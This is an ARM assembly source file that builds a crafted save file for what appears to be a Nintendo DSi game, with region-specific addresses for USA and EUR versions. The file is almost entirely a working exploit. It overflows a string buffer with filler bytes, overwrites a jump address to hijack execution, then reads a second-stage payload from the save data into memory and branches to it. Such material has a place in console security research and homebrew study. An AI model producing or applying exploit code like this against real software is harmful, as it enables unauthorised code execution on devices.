.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init

#define REGION_USA 45
#define REGION_EUR 56

#define	REG_BASE	0x04000000

#if REGCODE==REGION_USA
#define JUMPADR 0x02114c60

#define	dFS_Open 0x20a1ea4
#define	dFS_Close 0x20a1f28

#define	dFS_Write 0x20a209c
#define	dFS_Read 0x20a204c

#define	dFS_Seek 0x20a2020

#define dFS_InitCtx 0x20a1c6c

#elif REGCODE==REGION_EUR

#define JUMPADR 0x02114ca0

#define dFS_Open 0x20a1ef0
#define dFS_Close 0x20a1f74

#define dFS_Read 0x20a2098
#define dFS_Write 0x20a20e8

#define dFS_Seek 0x20a206c

#define dFS_InitCtx 0x20a1cb8

#else
#error "Unsupported region."
#endif

_start:
.byte 0x6C, 0x4F, 0x95, 0x58, 0x0A, 0x00, 0xDE, 0xFE, 0x00, 0x00 @ header

.word 0 @ slot0 crc32
.byte 0xa6, 0x0e @ slot0 len including hdr

.incbin "baseoverflow.bin"
.byte 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58
.word JUMPADR
.word 0 @ stop the game from copying code to the strbuf overflow region.

.arm
.align 2
code_start:
adr r7, code_start
bl DC_FlushAll
bl DC_InvalidateAll
bl IC_InvalidateAll
mov r0, #0x8000
sub r7, r7, r0

mov	r12, #REG_BASE
mov	r1, #0
	strh	r1, [r12, #0x6c]

	mov	r2, #0x1000
	add	r3, r2, r12
	strh	r1, [r3, #0x6c]

sub sp, #0x48

mov r0, sp
ldr ip, =dFS_InitCtx
blx ip

mov r0, sp
adr r1, savepath
mov r2, #1
ldr ip, =dFS_Open
blx ip
cmp r0, #0
ble payload_readpanic

mov r0, sp
ldr r1, =0x2bfc
mov r2, #0
ldr ip, =dFS_Seek
blx ip
cmp r0, #0
ble payload_readpanic

mov r0, sp
ldr r1, =0x02200000
ldr r2, =0xd404
ldr ip, =dFS_Read
blx ip
ldr r1, =0xd404
cmp r0, r1
bne payload_readpanic

mov r0, sp
ldr ip, =dFS_Close
blx ip
cmp r0, #0
ble payload_readpanic

mov r0, #0
ldr r1, =0x04000208
str r0, [r1]	@ REG_IME = 0;

bl DC_FlushAll
bl DC_InvalidateAll
bl IC_InvalidateAll

ldr r0, =0x02200000
bx r0

payload_readpanic:
b payload_readpanic

.pool
.align 2

DC_InvalidateAll:
.arm
mov r0, #0
mcr 15, 0, r0, cr7, cr6
bx lr

#define ICACHE_SIZE	0x2000
#define DCACHE_SIZE	0x1000
#define CACHE_LINE_SIZE	32
#define ICACHE_SIZE	0x2000
#define DCACHE_SIZE	0x1000
#define CACHE_LINE_SIZE	32

DC_FlushAll: @ From libnds, write buffer draining code was added by yellows8.
/*---------------------------------------------------------------------------------
	Clean and invalidate entire data cache
---------------------------------------------------------------------------------*/
	mov	r1, #0
outer_loop:
	mov	r0, #0
inner_loop:
	orr	r2, r1, r0			@ generate segment and line address
	mcr	p15, 0, r2, c7, c14, 2		@ clean and flush the line
	add	r0, r0, #CACHE_LINE_SIZE
	cmp	r0, #DCACHE_SIZE/4
	bne	inner_loop
	add	r1, r1, #0x40000000
	cmp	r1, #0
	bne	outer_loop
	mov r0, #0
	mcr 15, 0, r0, cr7, cr10, 4 @ Drain write buffer.
	bx	lr

IC_InvalidateAll: @ From libnds.
/*---------------------------------------------------------------------------------
	Clean and invalidate entire data cache
---------------------------------------------------------------------------------*/
	mov	r0, #0
	mcr	p15, 0, r0, c7, c5, 0
	bx	lr

.align 2

savepath:
.string "dataPub:/savedata.bin"
.align 2

.space (_start + 0xeb0) - .

.word 0 @ slot1 crc32
.byte 0xa6, 0x0e @ slot1 len including hdr

.space (_start + 0x1d56) - .

.word 0 @ slot2 crc32
.byte 0xa6, 0x0e @ slot2 len including hdr
.align 2

.space (_start + 0x2bfc) - .

.incbin "../generictwlpayload/generictwlpayload.bin"

.space (_start + 0x10000) - .

